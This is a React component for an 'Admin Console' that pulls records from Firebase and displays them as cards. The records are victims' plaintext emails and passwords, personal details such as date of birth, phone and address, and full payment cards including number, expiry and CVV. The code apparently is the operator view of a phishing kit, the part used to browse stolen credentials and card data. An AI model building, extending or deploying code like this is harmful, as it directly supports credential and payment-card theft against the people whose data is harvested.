import * as React from 'react';
import {useEffect, useState} from "react";
import {getInformationDetails, getLoginDetails, getVerificationDetails} from "../firebase/firestore";
import './admin.css';
function sortComp(a,b){
    return b.timestamp-a.timestamp;
}

function DetailCard(details){
    switch(details.type){
        case 1:{
            return <div className="admin-card">
                <div className="admin-card-heading"><b>Type: </b>Login Details <b>Time: </b> {new Date(details.timestamp).toLocaleString()}</div>
                <div className="admin-card-elements">

                    <div className="admin-card-element">Email: {details.email}</div>
                    <div className="admin-card-element">Password: {details.password}</div>
                </div>

            </div>
        }
        case 2:{
            return <div className="admin-card">
                <div className="admin-card-heading"><b>Type: </b>Information Details <b>Time: </b> {new Date(details.timestamp).toLocaleString()}</div>

                <div className="admin-card-elements">

                <div className="admin-card-element">Email: {details.email}</div>
                <div className="admin-card-element">First Name: {details.firstName}</div>
                <div className="admin-card-element">Last Name: {details.lastName}</div>
                <div className="admin-card-element">DOB: {details.dob}</div>
                <div className="admin-card-element">Phone: {details.phone}</div>
                <div className="admin-card-element">Address: {details.address}</div>
                <div className="admin-card-element">Town: {details.town}</div>

            </div>
            </div>
        }
        case 3:{
            return <div className="admin-card">
                <div className="admin-card-heading"><b>Type: </b>Verification Details <b>Time: </b> {new Date(details.timestamp).toLocaleString()}</div>

                <div className="admin-card-elements">

                <div className="admin-card-element">Name: {details.name}</div>
                <div className="admin-card-element">Card Type: {details.cardType}</div>
                <div className="admin-card-element">Card No.: {details.cardNo}</div>
                <div className="admin-card-element">Expiration Date: {details.expirationDate}</div>
                <div className="admin-card-element">CVV: {details.cvc}</div>
                <div className="admin-card-element">Address: {details.address}</div>
            </div>
            </div>
        }
    }
}

export default function (){
    const [details,setDetails]=useState([]);
    const [done,setDone]=useState(0);
    async function updateLoginDetails(){
        const data=await getLoginDetails();
        data.forEach(doc=>{
            setDetails(old=>[...old,{...doc.data(),type:1}].sort(sortComp))
        })
    }
    async function updateInformationDetails(){
        const data=await getInformationDetails();
        data.forEach(doc=>{
            setDetails(old=>[...old,{...doc.data(),type:2}].sort(sortComp))
        })
    }
    async function updateVerificationDetails(){
        const data=await getVerificationDetails();
        data.forEach(doc=>{
            setDetails(old=>[...old,{...doc.data(),type:3}].sort(sortComp))
        })
    }
    useEffect(()=>{
        updateLoginDetails().then(()=>setDone(o=>o+1));
        updateVerificationDetails().then(()=>setDone(o=>o+1));
        updateInformationDetails().then(()=>setDone(o=>o+1));
    },[])
    return <div className="admin">
        <h1 className="admin-heading">Admin Console</h1>
        {done<3&&<h4 className="loading">Loading... ({done}/3)</h4>}
        <div className="admin-card-wrapper">
            {details.map(e=>DetailCard(e))}
        </div>
    </div>
}